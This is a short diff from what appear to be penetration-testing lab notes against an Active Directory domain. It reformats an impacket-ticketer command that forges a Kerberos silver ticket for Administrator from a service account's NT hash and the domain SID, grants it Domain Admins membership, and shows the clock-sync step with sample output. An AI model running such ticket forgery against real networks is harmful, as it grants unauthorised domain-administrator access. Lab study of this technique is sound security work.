@@ -130,8 +130,13 @@ impacket-lookupsid contoso.org/Administrator@192.168.68.179
 
 # generate TGS that is signed with service account's kerberos key (derived from -nthash) 
 # for the target user "Administrator" and target SPN MSSQLSvc and apply 512 group to that user
-### DONT FORGET TO FIX THE CLOCK SKEW
-sudo ntpdate 192.168.68.64 && sudo impacket-ticketer -nthash fd72ca83b31d63f864440afa274bbd0c -domain-sid S-1-5-21-245103785-2483314120-3684157271 -domain contoso.org -spn HOST/WIN-KML6TP4LOOL Administrator
+sudo ntpdate 192.168.68.64 && \
+sudo impacket-ticketer \
+-nthash fd72ca83b31d63f864440afa274bbd0c \
+-domain-sid S-1-5-21-245103785-2483314120-3684157271 \
+-domain contoso.org \
+-spn HOST/WIN-KML6TP4LOOL \
+Administrator
 # 2025-02-20 02:31:38.877088 (+1100) +0.101192 +/- 0.000193 192.168.68.64 s1 no-leap
 # Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
